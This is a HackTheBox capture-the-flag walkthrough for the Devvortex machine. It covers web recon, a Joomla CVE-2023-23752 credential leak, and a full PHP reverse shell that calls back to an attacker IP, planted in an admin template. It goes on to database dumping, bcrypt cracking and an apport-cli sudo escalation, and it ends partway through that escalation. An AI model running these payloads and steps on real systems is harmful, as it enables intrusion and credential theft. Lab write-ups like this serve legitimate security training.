---
slug: devvortex
hide:
    - navigation
tags:
    - HackTheBox
    - Writeups
    - Walkthrough
    - Linux
    - Web
    - Joomla
    - Mysql
---

[:octicons-arrow-left-24: Back to HackTheBox Writeups](/docs/pages/writeups/htb/index.md){ .sm-button }

# **DevVortex**

![](https://live.staticflickr.com/65535/53504825490_895537b180_c.jpg){loading=lazy}

??? info "Information"
    **Machine**: [Devvortex](https://app.hackthebox.com/machines/577)  
    **Level**: `Easy`  
    **Tags**: `Linux`, `Web`, `Joomla`, `Mysql`  
    **Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/577)  


---

## 🚀 **Starting**

```bash
echo -n "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

### **Port Scanning**  
Let's start with some port scanning using Nmap.

```bash
sudo nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.242
```

Nmap Results:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 14:34 EST
Nmap scan report for 10.10.11.242
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/23%OT=22%CT=1%CU=43011%PV=Y%DS=2%DC=T%G=Y%TM=658
OS:7368C%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=107%TI=
OS:Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M5
OS:3CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88
OS:%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   246.36 ms 10.10.14.1
2   247.25 ms 10.10.11.242
```

As we can see, on this `Ubuntu` system, there is a web server `http nginx 1.18.0` being served on port `80`


```bash
curl -Ik http://devvortex.htb                                                   
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Dec 2023 11:22:39 GMT
Content-Type: text/html
Content-Length: 18048
Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT
Connection: keep-alive
ETag: "6500a3d2-4680"
Accept-Ranges: bytes
```
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703447116/mtvbdutfu2kaurgfebp5.png)

Since we are dealing with a web server, let's start simple by enumerating possible subdomains and directories.

### **Subdomain Enumeration**  

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:SUB -mc 200 -timeout 5 -ignore-body -t 100 -rate 10 -u http://SUB.devvortex.htb

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://SUB.devvortex.htb
 :: Wordlist         : SUB: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 5
 :: Threads          : 100
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 191ms]
```

We've found a subdomain `dev`.

### **Directory Enumeration**  
Enumerating directories on root domain:
```bash
feroxbuster -k -r -d 0 -n -s 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -o fuzz-directories.feroxbuster -u http://devvortex.htb/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devvortex.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz-directories.feroxbuster
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
.
.
. Nothing useful here, the results were omitted.
```

Enumerating directories on `dev` subdomain:
```bash
feroxbuster -k -r -d 0 -n -s 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -o fuzz-directories.feroxbuster -u http://dev.devvortex.htb/
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.devvortex.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz-directories.feroxbuster
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
.
.
. Filtered results below:

http://dev.devvortex.htb/
http://dev.devvortex.htb/index.php
http://dev.devvortex.htb/home
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/images/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/media/
http://dev.devvortex.htb/templates/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/tmp/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/cli/
```

### **Content Discovery**  
Enumerating files on root domain:
```bash
feroxbuster -k -r -d 0 -n -s 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -o fuzz-directories.feroxbuster -u http://devvortex.htb/ 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devvortex.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz-directories.feroxbuster
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
.
.
. Nothing useful here, the results were ommited.
```


Enumerating files on `dev` subdomain:
```bash
feroxbuster -k -r -d 0 -n -s 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -o fuzz-directories.feroxbuster -u http://dev.devvortex.htb/ 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.devvortex.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz-directories.feroxbuster
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
.
.
. Filtered results below:

http://dev.devvortex.htb/
http://dev.devvortex.htb/index.php
http://dev.devvortex.htb/robots.txt
http://dev.devvortex.htb/configuration.php
http://dev.devvortex.htb/htaccess.txt
```


### **Analyzing robots.txt**

```bash
curl -ik http://dev.devvortex.htb/robots.txt
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Dec 2023 12:05:03 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 764
Last-Modified: Tue, 13 Dec 2022 12:15:44 GMT
Connection: keep-alive
ETag: "63986cf0-2fc"
Accept-Ranges: bytes

# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

These endpoints are pretty interesting, let's see what we have at `/administrator`

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703447218/ck3knegyisl2lu1s7u0k.png)

It is the default Joomla administration login page. Let's try some quick scanning using `joomscan`.

```bash
joomscan --url http://dev.devvortex.htb -ec

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

[+] Enumeration component
[++] components are not found


Your Report : reports/dev.devvortex.htb/

```

Just a new information that it is running Joomla version `4.2.6`.

---

## 🪲 **Vulnerability Scan**

With the gathered information previously, it is possible to search through web for CVEs, I just tried: `joomla 4.2.6 CVE`.

Looking through the results it is possible to identify that this version is vulnerable to [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752), this vulnerability is about unauthenticated information disclosure.

After searching for some exploits for this CVE, I found [this one](https://github.com/Acceis/exploit-CVE-2023-23752) on Github.

---

## 🎯 **Exploit**

After installing the required dependencies, running the exploit we get the following results:

```bash
ruby exploit.rb http://dev.devvortex.htb 
```

```bash
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

As we can see in the PoC, there is a credential leakage in the results! Let's try to login:
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703447410/q6psjp4qx5kresnw4evy.png)

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703447482/jm5smmjsfnjb5rj3uxrs.png)

In Joomla, navigating through `System > Templates > Administrator Templates`, we are able to edit some `.php` files, since we have access to `/administrator` endpoint we can try to set a payload into `login.php` file.

### **PentestMonkey Payload**
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.12';
$port = 13337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703447607/tspltw1ycfmvmlycygtu.png)

### **Setting a Netcat Listener**

```bash
$ nc -lnvp 13337
listening on [any] 13337 ...
```  
Now, right when logged out to get back to `/administrator` endpoint, we have the following:

```bash
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.242] 38370
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 16:52:16 up  6:32,  0 users,  load average: 0.03, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:/$ whoami
whoami
www-data
```

### **Netcat Stabilization**

```bash
www-data@devvortex:/$ which bash
which bash
/usr/bin/bash
www-data@devvortex:/$ python3 --version     
python3 --version
Python 3.8.10
www-data@devvortex:/$ python3 -c 'import pty;pty.spawn("/usr/bin/bash")' && export TERM=xterm
www-data@devvortex:/$ ^Z                
zsh: suspended  nc -lnvp 13337
$ stty raw -echo; fg
[1]  + continued  nc -lnvp 13337
www-data@devvortex:/$ whoami
www-data
```

---

## 🏁 **Flag Exfiltration**

Since we got a foothold, it is time to action on objectives.

### **Internal Port Enumeration**
```
www-data@devvortex:/$ netstat -plunte                                     
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        23697      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          24518      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      114        25794      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        24770      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          23145      880/nginx: worker p 
tcp6       0      0 :::22                   :::*                    LISTEN      0          24529      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          23146      880/nginx: worker p 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        23696      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          20547      -           
```

### **User Enumeration**
```bash
www-data@devvortex:/$ cat /etc/passwd | grep -v "nologin"
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

### **Mysql Database**  

We have a local database running at `3306` as expected. Also we have permissions to execute `mysql`:
```bash
www-data@devvortex:/$ which mysql
/usr/bin/mysql
www-data@devvortex:/$ ls -l /usr/bin/mysql
-rwxr-xr-x 1 root root 7681168 Oct 25 17:34 /usr/bin/mysql
```

Now let's try to connect using the previous credentials:
```bash
www-data@devvortex:/$ mysql -h localhost -u lewis -p'P4ntherg0t1n5r3c0n##'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 28586
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;       
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis | lewis | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0 | | NULL | 0 | | | 0 | |  
| 650 | logan paul | logan | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | | 0 | |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
2 rows in set (0.00 sec)

```

### **Lateral Movement**
We have found an user named `logan` which is present in our system (also in Joomla). Let's crack his password using `john`.

```bash
echo -n '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' | tee logan.hash
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12                                                                                                                 
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt logan.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:10 DONE (2023-12-24 12:37) 0.09174g/s 128.8p/s 128.8c/s 128.8C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


```bash
www-data@devvortex:/$ su logan
Password: 
logan@devvortex:/$ whoami
logan
logan@devvortex:~$ cd
logan@devvortex:~$ ll
total 28
drwxr-xr-x 3 logan logan 4096 Nov 21 11:04 ./
drwxr-xr-x 3 root  root  4096 Sep 26 19:16 ../
lrwxrwxrwx 1 root  root     9 Oct 26 14:58 .bash_history -> /dev/null
-rw-r--r-- 1 logan logan  220 Sep 26 19:16 .bash_logout
-rw-r--r-- 1 logan logan 3771 Sep 26 19:16 .bashrc
drwx------ 2 logan logan 4096 Oct 26 15:12 .cache/
-rw-r--r-- 1 logan logan  807 Sep 26 19:16 .profile
-rw-r----- 1 root  logan   33 Dec 24 10:20 user.txt
logan@devvortex:~$ cat user.txt 
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### **Privilege Escalation**

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

logan@devvortex:~$ which apport-cli
/usr/bin/apport-cli

logan@devvortex:~$ ls -l /usr/bin/apport-cli
-rwxr-xr-x 1 root root 13367 Apr 16  2020 /usr/bin/apport-cli

```

As we can see the user has `sudo` privileges for `apport-cli` binary, which is a `root` owned binary.
```bash
logan@devvortex:/$ apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.

logan@devvortex:/$ apport-cli --version
2.20.11
```

After searching about `apport-cli` vulnerabilities for version `2.20.11`, we find the [**CVE-2023-1326**](https://github.com/diego-tella/CVE-2023-1326-PoC), let's exploit it:
```bash
logan@devvortex:/$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
